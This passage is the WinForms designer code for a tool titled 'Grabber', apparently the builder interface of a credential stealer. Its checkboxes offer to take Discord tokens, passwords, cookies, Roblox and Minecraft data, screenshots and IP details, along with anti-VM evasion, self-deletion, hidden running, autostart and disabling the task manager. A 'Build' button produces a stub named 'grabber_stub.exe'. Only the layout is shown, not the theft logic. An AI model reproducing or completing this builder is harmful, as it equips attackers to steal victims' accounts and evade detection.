            this.pass.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.pass.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.pass.ForeColor = System.Drawing.Color.Crimson;
            this.pass.Location = new System.Drawing.Point(20, 45);
            this.pass.Name = "pass";
            this.pass.Size = new System.Drawing.Size(121, 29);
            this.pass.TabIndex = 4;
            this.pass.Text = "Passwords";
            this.pass.UseVisualStyleBackColor = true;
            // 
            // panel4
            // 
            this.panel4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(5)))), ((int)(((byte)(10)))));
            this.panel4.Controls.Add(this.qr);
            this.panel4.Controls.Add(this.label6);
            this.panel4.Controls.Add(this.Info);
            this.panel4.Controls.Add(this.Token);
            this.panel4.Location = new System.Drawing.Point(3, 3);
            this.panel4.Name = "panel4";
            this.panel4.Size = new System.Drawing.Size(294, 211);
            this.panel4.TabIndex = 1;
            // 
            // qr
            // 
            this.qr.AutoSize = true;
            this.qr.Checked = true;
            this.qr.CheckState = System.Windows.Forms.CheckState.Checked;
            this.qr.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.qr.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.qr.ForeColor = System.Drawing.Color.Crimson;
            this.qr.Location = new System.Drawing.Point(20, 111);
            this.qr.Name = "qr";
            this.qr.Size = new System.Drawing.Size(118, 29);
            this.qr.TabIndex = 7;
            this.qr.Text = "Disable qr";
            this.qr.UseVisualStyleBackColor = true;
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label6.ForeColor = System.Drawing.Color.Crimson;
            this.label6.Location = new System.Drawing.Point(3, 0);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(96, 31);
            this.label6.TabIndex = 6;
            this.label6.Text = "Discord";
            // 
            // Info
            // 
            this.Info.AutoSize = true;
            this.Info.Checked = true;
            this.Info.CheckState = System.Windows.Forms.CheckState.Checked;
            this.Info.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.Info.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.Info.ForeColor = System.Drawing.Color.Crimson;
            this.Info.Location = new System.Drawing.Point(18, 75);
            this.Info.Name = "Info";
            this.Info.Size = new System.Drawing.Size(136, 29);
            this.Info.TabIndex = 5;
            this.Info.Text = "Discord info";
            this.Info.UseVisualStyleBackColor = true;
            // 
            // Token
            // 
            this.Token.AutoSize = true;
            this.Token.Checked = true;
            this.Token.CheckState = System.Windows.Forms.CheckState.Checked;
            this.Token.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.Token.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.Token.ForeColor = System.Drawing.Color.Crimson;
            this.Token.Location = new System.Drawing.Point(20, 45);
            this.Token.Name = "Token";
            this.Token.Size = new System.Drawing.Size(153, 29);
            this.Token.TabIndex = 4;
            this.Token.Text = "Discord Token";
            this.Token.UseVisualStyleBackColor = true;
            // 
            // tabPage3
            // 
            this.tabPage3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(11)))), ((int)(((byte)(7)))), ((int)(((byte)(17)))));
            this.tabPage3.Controls.Add(this.panel11);
            this.tabPage3.Controls.Add(this.panel10);
            this.tabPage3.Location = new System.Drawing.Point(4, 29);
            this.tabPage3.Name = "tabPage3";
            this.tabPage3.Size = new System.Drawing.Size(672, 432);
            this.tabPage3.TabIndex = 2;
            this.tabPage3.Text = "tabPage3";
            // 
            // panel11
            // 
            this.panel11.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(5)))), ((int)(((byte)(10)))));
            this.panel11.Controls.Add(this.Hidden);
            this.panel11.Controls.Add(this.label13);
            this.panel11.Controls.Add(this.dell);
            this.panel11.Controls.Add(this.vm);
            this.panel11.Location = new System.Drawing.Point(347, 3);
            this.panel11.Name = "panel11";
            this.panel11.Size = new System.Drawing.Size(283, 426);
            this.panel11.TabIndex = 3;
            // 
            // Hidden
            // 
            this.Hidden.AutoSize = true;
            this.Hidden.Checked = true;
            this.Hidden.CheckState = System.Windows.Forms.CheckState.Checked;
            this.Hidden.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.Hidden.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.Hidden.ForeColor = System.Drawing.Color.Crimson;
            this.Hidden.Location = new System.Drawing.Point(20, 111);
            this.Hidden.Name = "Hidden";
            this.Hidden.Size = new System.Drawing.Size(95, 29);
            this.Hidden.TabIndex = 7;
            this.Hidden.Text = "Hidden";
            this.Hidden.UseVisualStyleBackColor = true;
            // 
            // label13
            // 
            this.label13.AutoSize = true;
            this.label13.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label13.ForeColor = System.Drawing.Color.Crimson;
            this.label13.Location = new System.Drawing.Point(3, 0);
            this.label13.Name = "label13";
            this.label13.Size = new System.Drawing.Size(107, 31);
            this.label13.TabIndex = 6;
            this.label13.Text = "Program";
            // 
            // dell
            // 
            this.dell.AutoSize = true;
            this.dell.Checked = true;
            this.dell.CheckState = System.Windows.Forms.CheckState.Checked;
            this.dell.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.dell.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.dell.ForeColor = System.Drawing.Color.Crimson;
            this.dell.Location = new System.Drawing.Point(20, 75);
            this.dell.Name = "dell";
            this.dell.Size = new System.Drawing.Size(125, 29);
            this.dell.TabIndex = 5;
            this.dell.Text = "Self Delete";
            this.dell.UseVisualStyleBackColor = true;
            // 
            // vm
            // 
            this.vm.AutoSize = true;
            this.vm.Checked = true;
            this.vm.CheckState = System.Windows.Forms.CheckState.Checked;
            this.vm.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.vm.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.vm.ForeColor = System.Drawing.Color.Crimson;
            this.vm.Location = new System.Drawing.Point(20, 45);
            this.vm.Name = "vm";
            this.vm.Size = new System.Drawing.Size(103, 29);
            this.vm.TabIndex = 4;
            this.vm.Text = "Anti VM";
            this.vm.UseVisualStyleBackColor = true;
            // 
            // panel10
            // 
            this.panel10.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(5)))), ((int)(((byte)(10)))));
            this.panel10.Controls.Add(this.start);
            this.panel10.Controls.Add(this.Luq);
            this.panel10.Controls.Add(this.label12);
            this.panel10.Controls.Add(this.Fat);
            this.panel10.Controls.Add(this.Mgr);
            this.panel10.Location = new System.Drawing.Point(3, 3);
            this.panel10.Name = "panel10";
            this.panel10.Size = new System.Drawing.Size(273, 426);
            this.panel10.TabIndex = 2;
            // 
            // start
            // 
            this.start.AutoSize = true;
            this.start.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.start.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.start.ForeColor = System.Drawing.Color.Crimson;
            this.start.Location = new System.Drawing.Point(18, 146);
            this.start.Name = "start";
            this.start.Size = new System.Drawing.Size(117, 29);
            this.start.TabIndex = 8;
            this.start.Text = "AutoStart";
            this.start.UseVisualStyleBackColor = true;
            // 
            // Luq
            // 
            this.Luq.AutoSize = true;
            this.Luq.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.Luq.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.Luq.ForeColor = System.Drawing.Color.Crimson;
            this.Luq.Location = new System.Drawing.Point(20, 111);
            this.Luq.Name = "Luq";
            this.Luq.Size = new System.Drawing.Size(102, 29);
            this.Luq.TabIndex = 7;
            this.Luq.Text = "Lua-OFF";
            this.Luq.UseVisualStyleBackColor = true;
            // 
            // label12
            // 
            this.label12.AutoSize = true;
            this.label12.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label12.ForeColor = System.Drawing.Color.Crimson;
            this.label12.Location = new System.Drawing.Point(3, 0);
            this.label12.Name = "label12";
            this.label12.Size = new System.Drawing.Size(90, 31);
            this.label12.TabIndex = 6;
            this.label12.Text = "System";
            // 
            // Fat
            // 
            this.Fat.AutoSize = true;
            this.Fat.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.Fat.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.Fat.ForeColor = System.Drawing.Color.Crimson;
            this.Fat.Location = new System.Drawing.Point(18, 75);
            this.Fat.Name = "Fat";
            this.Fat.Size = new System.Drawing.Size(96, 29);
            this.Fat.TabIndex = 5;
            this.Fat.Text = "Fat-OFF";
            this.Fat.UseVisualStyleBackColor = true;
            // 
            // Mgr
            // 
            this.Mgr.AutoSize = true;
            this.Mgr.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.Mgr.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.Mgr.ForeColor = System.Drawing.Color.Crimson;
            this.Mgr.Location = new System.Drawing.Point(20, 45);
            this.Mgr.Name = "Mgr";
            this.Mgr.Size = new System.Drawing.Size(106, 29);
            this.Mgr.TabIndex = 4;
            this.Mgr.Text = "Mgr-OFF";
            this.Mgr.UseVisualStyleBackColor = true;
            // 
            // tabPage4
            // 
            this.tabPage4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(11)))), ((int)(((byte)(7)))), ((int)(((byte)(17)))));
            this.tabPage4.Controls.Add(this.buildButton);
            this.tabPage4.Controls.Add(this.panel9);
            this.tabPage4.Controls.Add(this.panel7);
            this.tabPage4.Location = new System.Drawing.Point(4, 29);
            this.tabPage4.Name = "tabPage4";
            this.tabPage4.Size = new System.Drawing.Size(672, 432);
            this.tabPage4.TabIndex = 3;
            this.tabPage4.Text = "tabPage4";
            this.tabPage4.Click += new System.EventHandler(this.tabPage4_Click);
            // 
            // buildButton
            // 
            this.buildButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.buildButton.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.buildButton.ForeColor = System.Drawing.Color.Crimson;
            this.buildButton.Location = new System.Drawing.Point(4, 335);
            this.buildButton.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.buildButton.Name = "buildButton";
            this.buildButton.Size = new System.Drawing.Size(656, 72);
            this.buildButton.TabIndex = 8;
            this.buildButton.Text = "Build";
            this.buildButton.UseVisualStyleBackColor = true;
            this.buildButton.Click += new System.EventHandler(this.buildButton_Click);
            // 
            // panel9
            // 
            this.panel9.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(5)))), ((int)(((byte)(10)))));
            this.panel9.Controls.Add(this.pictureBox1);
            this.panel9.Controls.Add(this.button6);
            this.panel9.Controls.Add(this.label11);
            this.panel9.Controls.Add(this.textBox5);
            this.panel9.Location = new System.Drawing.Point(18, 152);
            this.panel9.Name = "panel9";
            this.panel9.Size = new System.Drawing.Size(627, 175);
            this.panel9.TabIndex = 2;
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
            this.pictureBox1.Location = new System.Drawing.Point(478, 14);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(132, 111);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox1.TabIndex = 6;
            this.pictureBox1.TabStop = false;
            // 
            // button6
            // 
            this.button6.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.button6.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button6.Font = new System.Drawing.Font("Microsoft Tai Le", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button6.ForeColor = System.Drawing.Color.Crimson;
            this.button6.Location = new System.Drawing.Point(522, 138);
            this.button6.Name = "button6";
            this.button6.Size = new System.Drawing.Size(90, 34);
            this.button6.TabIndex = 5;
            this.button6.Text = "ICO";
            this.button6.UseVisualStyleBackColor = true;
            this.button6.Click += new System.EventHandler(this.button6_Click);
            // 
            // label11
            // 
            this.label11.AutoSize = true;
            this.label11.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label11.ForeColor = System.Drawing.Color.Crimson;
            this.label11.Location = new System.Drawing.Point(10, 11);
            this.label11.Name = "label11";
            this.label11.Size = new System.Drawing.Size(125, 31);
            this.label11.TabIndex = 3;
            this.label11.Text = "Avatar url:";
            // 
            // textBox5
            // 
            this.textBox5.BackColor = System.Drawing.Color.Crimson;
            this.textBox5.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.textBox5.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.textBox5.Location = new System.Drawing.Point(16, 54);
            this.textBox5.Multiline = true;
            this.textBox5.Name = "textBox5";
            this.textBox5.Size = new System.Drawing.Size(440, 34);
            this.textBox5.TabIndex = 4;
            this.textBox5.Text = "grabber_stub.exe";
            // 
            // panel7
            // 
            this.panel7.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(5)))), ((int)(((byte)(10)))));
            this.panel7.Controls.Add(this.button4);
            this.panel7.Controls.Add(this.label9);
            this.panel7.Controls.Add(this.textBox4);
            this.panel7.Location = new System.Drawing.Point(18, 25);
            this.panel7.Name = "panel7";
            this.panel7.Size = new System.Drawing.Size(627, 108);
            this.panel7.TabIndex = 1;
            // 
            // button4
            // 
            this.button4.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.button4.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button4.Font = new System.Drawing.Font("Microsoft Tai Le", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button4.ForeColor = System.Drawing.Color.Crimson;
            this.button4.Location = new System.Drawing.Point(522, 63);
            this.button4.Name = "button4";
            this.button4.Size = new System.Drawing.Size(90, 34);
            this.button4.TabIndex = 5;
            this.button4.Text = "OK";
            this.button4.UseVisualStyleBackColor = true;
            this.button4.Click += new System.EventHandler(this.button4_Click);
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label9.ForeColor = System.Drawing.Color.Crimson;
            this.label9.Location = new System.Drawing.Point(10, 11);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(128, 31);
            this.label9.TabIndex = 3;
            this.label9.Text = "EXE Name:";
            // 
            // textBox4
            // 
            this.textBox4.BackColor = System.Drawing.Color.Crimson;
            this.textBox4.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.textBox4.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.textBox4.Location = new System.Drawing.Point(16, 63);
            this.textBox4.Multiline = true;
            this.textBox4.Name = "textBox4";
            this.textBox4.Size = new System.Drawing.Size(500, 34);
            this.textBox4.TabIndex = 4;
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(9F, 20F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(11)))), ((int)(((byte)(7)))), ((int)(((byte)(17)))));
            this.ClientSize = new System.Drawing.Size(858, 515);
            this.Controls.Add(this.tabControl1);
            this.Controls.Add(this.compiler);
            this.Controls.Add(this.grabb);
            this.Controls.Add(this.opcje);
            this.Controls.Add(this.setup);
            this.Controls.Add(this.panel1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "Form1";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Grabber";
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            this.tabControl1.ResumeLayout(false);
            this.tabPage1.ResumeLayout(false);
            this.panel3.ResumeLayout(false);
            this.panel3.PerformLayout();
            this.panel2.ResumeLayout(false);
            this.panel2.PerformLayout();
            this.tabPage2.ResumeLayout(false);
            this.panel8.ResumeLayout(false);
            this.panel8.PerformLayout();
            this.panel6.ResumeLayout(false);
            this.panel6.PerformLayout();
            this.panel5.ResumeLayout(false);
            this.panel5.PerformLayout();
            this.panel4.ResumeLayout(false);
            this.panel4.PerformLayout();
            this.tabPage3.ResumeLayout(false);
            this.panel11.ResumeLayout(false);
            this.panel11.PerformLayout();
            this.panel10.ResumeLayout(false);
            this.panel10.PerformLayout();
            this.tabPage4.ResumeLayout(false);
            this.panel9.ResumeLayout(false);
            this.panel9.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.panel7.ResumeLayout(false);
            this.panel7.PerformLayout();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Panel panel1;
        private System.Windows.Forms.Button button2;
        private System.Windows.Forms.Button button1;
        private System.Windows.Forms.Label label5;
        private System.Windows.Forms.Button compiler;
        private System.Windows.Forms.Button grabb;
        private System.Windows.Forms.Button opcje;
        private System.Windows.Forms.Button setup;
        private System.Windows.Forms.TabControl tabControl1;
        private System.Windows.Forms.TabPage tabPage1;
        private System.Windows.Forms.TabPage tabPage2;
        private System.Windows.Forms.TabPage tabPage3;
        private System.Windows.Forms.TabPage tabPage4;
        private System.Windows.Forms.Panel panel2;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.TextBox textBox1;
        private System.Windows.Forms.Panel panel3;
        private System.Windows.Forms.RadioButton Normal;
        private System.Windows.Forms.Button button3;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.TextBox title;
        private System.Windows.Forms.RadioButton quest;
        private System.Windows.Forms.RadioButton Error;
        private System.Windows.Forms.TextBox msg;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.Panel panel4;
        private System.Windows.Forms.Label label6;
        private System.Windows.Forms.CheckBox Info;
        private System.Windows.Forms.CheckBox Token;
        private System.Windows.Forms.Panel panel5;
        private System.Windows.Forms.CheckBox Disable;
        private System.Windows.Forms.Label label7;
        private System.Windows.Forms.CheckBox Cookies;
        private System.Windows.Forms.CheckBox pass;
        private System.Windows.Forms.Panel panel6;
        private System.Windows.Forms.Label label8;
        private System.Windows.Forms.CheckBox Roblox;
        private System.Windows.Forms.CheckBox Minecraft;
        private System.Windows.Forms.CheckBox qr;
        private System.Windows.Forms.Panel panel7;
        private System.Windows.Forms.Button button4;
        private System.Windows.Forms.Label label9;
        private System.Windows.Forms.TextBox textBox4;
        private System.Windows.Forms.Panel panel8;
        private System.Windows.Forms.CheckBox Screenshot;
        private System.Windows.Forms.Label label10;
        private System.Windows.Forms.CheckBox minfo;
        private System.Windows.Forms.CheckBox ip;
        private System.Windows.Forms.Button button5;
        private System.Windows.Forms.Button buildButton;
        private System.Windows.Forms.Panel panel9;
        private System.Windows.Forms.Button button6;
        private System.Windows.Forms.Label label11;
        private System.Windows.Forms.TextBox textBox5;
        private System.Windows.Forms.Panel panel11;
        private System.Windows.Forms.CheckBox Hidden;
        private System.Windows.Forms.Label label13;
        private System.Windows.Forms.CheckBox dell;
        private System.Windows.Forms.CheckBox vm;
        private System.Windows.Forms.Panel panel10;
        private System.Windows.Forms.CheckBox start;
        private System.Windows.Forms.CheckBox Luq;
        private System.Windows.Forms.Label label12;
        private System.Windows.Forms.CheckBox Fat;
        private System.Windows.Forms.CheckBox Mgr;
        private System.Windows.Forms.Button button7;
        private System.Windows.Forms.Button button8;
        private System.Windows.Forms.PictureBox pictureBox1;
    }
}

